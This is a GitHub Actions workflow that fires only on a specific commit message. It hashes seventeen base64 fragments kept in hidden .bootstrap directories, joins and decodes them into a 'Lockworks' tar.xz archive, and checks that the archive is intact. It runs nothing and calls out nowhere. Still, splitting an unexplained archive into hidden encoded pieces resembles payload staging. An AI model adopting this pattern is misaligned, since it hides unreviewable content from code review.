name: Diagnose Lockworks payload

on:
  push:
    branches: [main]

permissions:
  contents: write

jobs:
  diagnose:
    if: github.event.head_commit.message == 'Diagnose Lockworks payload'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Verify exact payload bytes
        shell: bash
        run: |
          set -euo pipefail
          files=(
            .bootstrap/payload/part00
            .bootstrap/payload/part01
            .bootstrap/payload/part02
            .bootstrap/payload/part03
            .bootstrap/fix/04a
            .bootstrap/fix/04b
            .bootstrap/fix/04c0
            .bootstrap/fix/04c1
            .bootstrap/payload/part05
            .bootstrap/payload/part06
            .bootstrap/fix/07a0
            .bootstrap/fix/07a1
            .bootstrap/fix/07b0
            .bootstrap/fix/07b1a
            .bootstrap/fix/07b1b
            .bootstrap/fix/07c0
            .bootstrap/fix/07c1
          )
          for f in "${files[@]}"; do wc -c "$f"; sha256sum "$f"; done
          cat "${files[@]}" > /tmp/lockworks.b64
          echo 'COMBINED B64:'
          wc -c /tmp/lockworks.b64
          sha256sum /tmp/lockworks.b64
          base64 -d /tmp/lockworks.b64 > /tmp/lockworks.tar.xz
          echo 'DECODED XZ:'
          wc -c /tmp/lockworks.tar.xz
          sha256sum /tmp/lockworks.tar.xz
          xz -t /tmp/lockworks.tar.xz
